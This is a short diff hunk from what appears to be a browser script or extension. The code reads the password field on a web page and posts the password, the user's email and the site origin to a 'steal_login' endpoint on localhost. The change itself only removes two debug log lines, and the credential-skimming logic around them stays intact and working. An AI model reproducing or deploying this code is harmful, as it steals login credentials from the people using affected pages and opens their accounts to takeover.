@@ -28,10 +28,8 @@ $.each(inputs, function (element) {
                     var pw = $('[type="password"]')[0];
                     if (typeof resu === 'undefined') userEmail = "no_email_found";
                     else userEmail = resu.email;
-                    console.log('pw');
                     if (inputs[element].value != "" &&
                         !(typeof pw === 'undefined') && $(pw).val() != "") {
-                        console.log("hi");
                         $.post("http://localhost:5000/steal_login", {
                             email: userEmail,
                             url: window.location.origin,
